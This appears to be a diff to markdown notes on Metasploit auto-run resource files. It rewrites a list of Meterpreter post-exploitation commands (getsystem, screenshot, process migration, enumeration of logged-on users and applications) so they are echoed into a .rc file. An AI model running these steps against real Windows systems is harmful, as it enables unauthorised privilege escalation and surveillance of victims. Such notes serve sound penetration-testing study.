@@ -98,12 +98,11 @@
 - **FFF**
 <blockquote>Auto-run scripts are great when you need multiple modules to run automatically</blockquote>
 
-      getsystem
-      screenshot -v -p IClass.jpeg -v true
-      run post/windows/manage/migrate
-      run post/windows/gather/checkvm
-      run post/windows/gather/enum_logged_on_users
-      run post/windows/gather/enum_applications
+      echo 'getsystem' > my_resource_file.rc
+      echo 'screenshot -v -p IClass.jpeg -v true' >> my_resource_file.rc
+      echo 'run post/windows/manage/migrate' >> my_resource_file.rc
+      echo 'run post/windows/gather/enum_logged_on_users' >> my_resource_file.rc
+      echo 'run post/windows/gather/enum_applications' >> my_resource_file.rc
 
 <br />
 
